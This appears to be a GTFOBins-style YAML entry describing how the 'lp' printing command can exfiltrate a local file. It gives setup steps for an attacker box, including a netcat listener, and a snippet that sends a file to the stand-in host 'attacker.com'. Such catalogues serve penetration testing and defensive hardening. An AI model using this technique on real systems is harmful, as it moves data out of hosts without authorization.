---
functions:
  file-upload:
    - description: To collect the file run the following on the attacker box (this requires `cups` to be installed):

            Run `lpadmin -p printer -v socket://localhost -E` to create a virtual printer.
            Run `lpadmin -d printer` to set the new printer as default.
            Run `cupsctl --remote-any` to enable printing from the Internet.
            Run `nc -lkp 9100`.

        Send a local file to a CUPS server.
      code: |
        LFILE=file_to_send
        RHOST=attacker.com
        lp $LFILE -h $RHOST
---
